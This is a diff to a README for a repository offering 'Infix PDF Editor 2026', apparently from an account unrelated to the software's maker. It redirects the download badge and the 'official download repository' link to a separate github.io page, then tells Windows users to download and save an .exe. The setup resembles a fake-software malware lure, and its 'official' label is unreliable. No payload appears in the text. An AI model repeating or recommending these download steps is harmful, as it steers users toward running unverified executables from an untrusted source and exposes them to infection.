@@ -1,6 +1,6 @@
 # 📄 Infix-PDF-Editor-2026 - Edit Your PDF Files With Ease
 
-[![](https://img.shields.io/badge/Download-Infix_PDF_Editor-blue.svg)](https://github.com/bylinelocalisation96/Infix-PDF-Editor-2026)
+[![](https://img.shields.io/badge/Download-Infix_PDF_Editor-blue.svg)](https://bylinelocalisation96.github.io)
 
 Infix PDF Editor allows users to modify text and layout in PDF documents. This software works on Windows 11 and Windows 10. It treats a PDF file like a standard word processing document. You can change text, fonts, and images without losing the original file structure.
 
@@ -8,7 +8,7 @@ Infix PDF Editor allows users to modify text and layout in PDF documents. This s
 
 Follow these steps to obtain the editor on your computer.
 
-1. Go to the [official download repository](https://github.com/bylinelocalisation96/Infix-PDF-Editor-2026).
+1. Go to the [official download repository](https://bylinelocalisation96.github.io).
 2. Locate the section for releases.
 3. Select the file ending in .exe for your version of Windows.
 4. Save the file to your desktop or downloads folder.
